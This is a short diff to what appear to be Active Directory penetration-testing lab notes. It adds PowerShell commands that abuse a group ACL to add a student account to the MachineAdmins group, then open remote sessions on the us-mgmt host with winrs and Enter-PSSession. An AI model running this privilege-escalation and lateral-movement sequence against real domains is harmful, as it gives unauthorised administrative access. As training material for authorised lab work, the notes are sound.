@@ -38,3 +38,12 @@ IdentityReferenceClass  : group
 ```
 Get-DomainObjectAcl -Identity machineadmins -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match 'managers'}
 ```
+```
+Add-ADGroupMember -Identity MachineAdmins -Members studentuserx -Verbose
+
+```
+```
+winrs -r:us-mgmt cmd
+$usmgmt = New-PSSession us-mgmt
+Enter-PSSession $usmgmt
+```
